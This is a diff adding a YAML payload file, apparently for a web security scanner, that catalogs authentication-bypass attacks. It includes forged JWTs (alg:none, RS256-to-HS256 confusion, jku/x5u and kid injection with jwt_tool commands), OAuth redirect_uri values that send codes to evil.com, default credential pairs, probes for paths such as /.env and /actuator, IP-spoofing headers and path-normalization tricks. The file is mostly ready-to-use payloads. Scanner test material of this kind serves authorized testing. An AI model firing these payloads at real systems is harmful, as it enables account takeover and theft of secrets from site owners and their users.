@@ -1,0 +1,417 @@
+defaults:
+  vuln_type: auth_bypass
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # JWT — none algorithm variants
+  # ============================================================
+  - technique: jwt_manipulation
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 3
+    payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.PAYLOAD_B64."
+    placeholders: [PAYLOAD_B64]
+    notes: "JWT with alg:none and empty signature. Replace PAYLOAD_B64 with base64url-encoded claims (e.g., {\"sub\":\"1\",\"role\":\"admin\"})."
+    tags: [jwt, none_algorithm, bypass]
+
+  - technique: jwt_manipulation
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 3
+    payload: "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.PAYLOAD_B64."
+    placeholders: [PAYLOAD_B64]
+    notes: "JWT with alg:None (capitalized). Bypasses case-sensitive alg checks that only block lowercase 'none'."
+    tags: [jwt, none_algorithm, case_bypass]
+
+  - technique: jwt_manipulation
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 3
+    payload: "eyJhbGciOiJuT05FIiwidHlwIjoiSldUIn0.PAYLOAD_B64."
+    placeholders: [PAYLOAD_B64]
+    notes: "JWT with alg:nONE (mixed case). Tests additional case-sensitivity edge cases."
+    tags: [jwt, none_algorithm, case_bypass]
+
+  # ============================================================
+  # JWT — algorithm confusion (RSA to HMAC)
+  # ============================================================
+  - technique: jwt_manipulation
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 4
+    payload: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.PAYLOAD_B64.SIGNATURE"
+    placeholders: [PAYLOAD_B64, SIGNATURE]
+    notes: >
+      JWT algorithm confusion: change alg from RS256 to HS256, then sign with the server's
+      RSA public key as the HMAC secret. Requires knowing the public key (often at /jwks.json
+      or /.well-known/jwks.json). Use: jwt_tool -X k -pk public.pem
+    tags: [jwt, algorithm_confusion, rs256_to_hs256]
+
+  # ============================================================
+  # JWT — claim manipulation
+  # ============================================================
+  - technique: jwt_manipulation
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 3
+    payload: "MODIFIED_JWT"
+    placeholders: [MODIFIED_JWT]
+    notes: >
+      Modify JWT claims (sub, role, admin, is_admin, email, user_id) without re-signing.
+      Tests if signature verification is enforced. Decode with jwt.io, change claims, send back.
+    tags: [jwt, claim_tampering, no_verify]
+
+  - technique: jwt_manipulation
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 3
+    payload: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.INVALID"
+    notes: "JWT with tampered claims (sub=1, role=admin) and invalid signature. Tests if signature verification is enforced at all."
+    tags: [jwt, claim_tampering, invalid_sig]
+
+  # ============================================================
+  # JWT — expired token
+  # ============================================================
+  - technique: jwt_manipulation
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "EXPIRED_JWT"
+    placeholders: [EXPIRED_JWT]
+    notes: "Send an expired JWT (exp in the past). Tests if the exp claim is validated. Use a previously captured token or forge one with past exp."
+    tags: [jwt, expiry, bypass]
+
+  # ============================================================
+  # JWT — jku / x5u header injection
+  # ============================================================
+  - technique: jwt_manipulation
+    injection_surface: header
+    evidence_type: dns_hit
+    risk: 4
+    payload: "JWT_WITH_JKU"
+    placeholders: [JWT_WITH_JKU]
+    notes: >
+      JWT with jku (JWK Set URL) header pointing to attacker-controlled JWKS endpoint.
+      Sign with your own RSA key, host the public key at COLLAB_DOMAIN/.well-known/jwks.json.
+      Use: jwt_tool -X s -ju 'https://COLLAB_DOMAIN/.well-known/jwks.json'
+    tags: [jwt, jku, key_injection, oob]
+
+  - technique: jwt_manipulation
+    injection_surface: header
+    evidence_type: dns_hit
+    risk: 4
+    payload: "JWT_WITH_X5U"
+    placeholders: [JWT_WITH_X5U]
+    notes: >
+      JWT with x5u (X.509 URL) header pointing to attacker-controlled certificate.
+      Similar to jku but uses X.509 certificate chain. Host cert at attacker URL.
+      Use: jwt_tool -X s -x5u 'https://COLLAB_DOMAIN/cert.pem'
+    tags: [jwt, x5u, key_injection, oob]
+
+  # ============================================================
+  # JWT — kid (Key ID) injection
+  # ============================================================
+  - technique: jwt_manipulation
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 4
+    payload: "JWT_WITH_KID_TRAVERSAL"
+    placeholders: [JWT_WITH_KID_TRAVERSAL]
+    notes: >
+      JWT with kid header set to path traversal: kid = "../../dev/null".
+      Sign with an empty string as the HMAC secret (contents of /dev/null).
+      Use: jwt_tool -I -hc kid -hv '../../dev/null' -S hs256 -p ''
+    tags: [jwt, kid, path_traversal, bypass]
+
+  - technique: jwt_manipulation
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 4
+    payload: "JWT_WITH_KID_SQLI"
+    placeholders: [JWT_WITH_KID_SQLI]
+    notes: >
+      JWT kid SQLi: kid = "' UNION SELECT 'known-secret' -- ". If the kid is looked up
+      via SQL query, inject a known secret value and sign the token with it.
+      Use: jwt_tool -I -hc kid -hv "' UNION SELECT 'secret' -- " -S hs256 -p 'secret'
+    tags: [jwt, kid, sqli, bypass]
+
+  # ============================================================
+  # OAuth — redirect_uri manipulation
+  # ============================================================
+  - technique: auth_bypass
+    injection_surface: query
+    evidence_type: redirect
+    risk: 3
+    payload: "redirect_uri=https://evil.com/callback"
+    notes: >
+      OAuth redirect_uri set to attacker domain. If the authorization server does not
+      strictly validate redirect_uri, the auth code or token is sent to the attacker.
+      Test on /authorize endpoint.
+    tags: [oauth, redirect_uri, open_redirect]
+
+  - technique: auth_bypass
+    injection_surface: query
+    evidence_type: redirect
+    risk: 3
+    payload: "redirect_uri=https://legitimate.com.evil.com/callback"
+    notes: >
+      OAuth redirect_uri with subdomain bypass. The domain looks like it belongs to the
+      legitimate site but actually resolves to evil.com. Tests weak domain validation.
+    tags: [oauth, redirect_uri, subdomain_bypass]
+
+  - technique: auth_bypass
+    injection_surface: query
+    evidence_type: redirect
+    risk: 3
+    payload: "redirect_uri=https://legitimate.com@evil.com/callback"
+    notes: >
+      OAuth redirect_uri with URL authority bypass using @ character.
+      Parser may extract 'legitimate.com' as the host, but the browser resolves to evil.com.
+    tags: [oauth, redirect_uri, authority_bypass]
+
+  - technique: auth_bypass
+    injection_surface: query
+    evidence_type: redirect
+    risk: 3
+    payload: "redirect_uri=https://legitimate.com/callback/../../../evil-path"
+    notes: >
+      OAuth redirect_uri with path traversal. Tests if redirect_uri path validation
+      only checks prefix and allows traversal to an unintended path.
+    tags: [oauth, redirect_uri, path_traversal]
+
+  # ============================================================
+  # Default credentials
+  # ============================================================
+  - technique: default_credential
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "admin:admin"
+    notes: "Default admin:admin credentials."
+    tags: [default_creds, admin]
+
+  - technique: default_credential
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "admin:password"
+    notes: "Default admin:password."
+    tags: [default_creds, admin]
+
+  - technique: default_credential
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "admin:123456"
+    notes: "Default admin:123456."
+    tags: [default_creds, admin]
+
+  - technique: default_credential
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "root:root"
+    notes: "Default root:root."
+    tags: [default_creds, root]
+
+  - technique: default_credential
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "test:test"
+    notes: "Default test:test."
+    tags: [default_creds, test]
+
+  - technique: default_credential
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "user:user"
+    notes: "Default user:user."
+    tags: [default_creds, user]
+
+  # ============================================================
+  # Forced browsing
+  # ============================================================
+  - technique: forced_browsing
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/admin"
+    notes: "Direct access to /admin without authentication."
+    tags: [forced_browsing, admin, path]
+
+  - technique: forced_browsing
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/admin/dashboard"
+    notes: "Direct access to admin dashboard."
+    tags: [forced_browsing, admin, dashboard]
+
+  - technique: forced_browsing
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/api/admin/users"
+    notes: "Direct access to admin API endpoint."
+    tags: [forced_browsing, api, admin]
+
+  - technique: forced_browsing
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/debug"
+    notes: "Direct access to debug endpoint."
+    tags: [forced_browsing, debug]
+
+  - technique: forced_browsing
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/graphql"
+    notes: "Direct access to GraphQL endpoint. Check for introspection with {__schema{types{name}}}."
+    tags: [forced_browsing, graphql]
+
+  - technique: forced_browsing
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/swagger"
+    notes: "Direct access to Swagger/OpenAPI docs. Also try /swagger-ui/, /api-docs, /openapi.json."
+    tags: [forced_browsing, swagger, docs]
+
+  - technique: forced_browsing
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/actuator"
+    notes: "Spring Boot Actuator endpoints. Also try /actuator/env, /actuator/health, /actuator/configprops."
+    tags: [forced_browsing, spring, actuator]
+
+  - technique: forced_browsing
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/.env"
+    notes: "Direct access to .env file. May contain API keys, DB credentials, secret keys."
+    tags: [forced_browsing, dotenv, secrets]
+
+  # ============================================================
+  # Auth bypass via header manipulation
+  # ============================================================
+  - technique: auth_bypass
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 3
+    payload: "X-Forwarded-For: 127.0.0.1"
+    notes: "Spoof internal IP via X-Forwarded-For to bypass IP-based auth restrictions."
+    tags: [header, xff, ip_bypass]
+
+  - technique: auth_bypass
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 3
+    payload: "X-Real-IP: 127.0.0.1"
+    notes: "Spoof internal IP via X-Real-IP header."
+    tags: [header, x_real_ip, ip_bypass]
+
+  - technique: auth_bypass
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 3
+    payload: "X-Original-URL: /admin"
+    notes: "Override URL path via X-Original-URL. Bypasses path-based access controls in IIS/Nginx."
+    tags: [header, x_original_url, path_bypass]
+
+  - technique: auth_bypass
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 3
+    payload: "X-Rewrite-URL: /admin"
+    notes: "Override URL path via X-Rewrite-URL. IIS URL Rewrite module respects this header."
+    tags: [header, x_rewrite_url, path_bypass]
+
+  # ============================================================
+  # Session fixation
+  # ============================================================
+  - technique: session_fixation
+    injection_surface: cookie
+    evidence_type: status_diff
+    risk: 3
+    payload: "session=ATTACKER_SESSION_ID"
+    placeholders: [ATTACKER_SESSION_ID]
+    notes: "Set session cookie to a known value before user authenticates. After login, check if the session ID remains the same — if so, session fixation is possible."
+    tags: [session, fixation, cookie]
+
+  # ============================================================
+  # Method override
+  # ============================================================
+  - technique: auth_bypass
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "X-HTTP-Method-Override: PUT"
+    notes: "HTTP method override header. May bypass method-based access controls (e.g., GET allowed but PUT blocked at proxy)."
+    tags: [header, method_override]
+
+  - technique: auth_bypass
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "X-HTTP-Method-Override: DELETE"
+    notes: "Override to DELETE method via header. Tests if method-based ACLs inspect the actual method or the override header."
+    tags: [header, method_override, delete]
+
+  # ============================================================
+  # Path manipulation bypasses
+  # ============================================================
+  - technique: auth_bypass
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/admin/../admin"
+    notes: "Path traversal normalization bypass. Middleware may reject /admin but the server resolves /admin/../admin back to /admin."
+    tags: [path, traversal, bypass]
+
+  - technique: auth_bypass
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/ADMIN"
+    notes: "Case manipulation. Tests if path-matching middleware is case-sensitive while the backend is case-insensitive."
+    tags: [path, case, bypass]
+
+  - technique: auth_bypass
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/admin/"
+    notes: "Trailing slash. Tests if /admin and /admin/ are routed to different handlers or if auth middleware only matches one form."
+    tags: [path, trailing_slash, bypass]
+
+  - technique: auth_bypass
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/admin;/"
+    notes: "Semicolon path parameter (Tomcat/Jetty). The servlet container treats /admin;/ as /admin, but a reverse proxy may not match it."
+    tags: [path, semicolon, tomcat, bypass]
+
+  - technique: auth_bypass
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/admin%2f"
+    notes: "URL-encoded trailing slash. Proxy sees /admin%2f (no match), backend decodes to /admin/."
+    tags: [path, url_encoded, bypass]
+
+  - technique: auth_bypass
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/%2e/admin"
+    notes: "URL-encoded dot in path. Proxy sees /%2e/admin (no match for /admin prefix), backend resolves to /./admin = /admin."
+    tags: [path, url_encoded, dot, bypass]
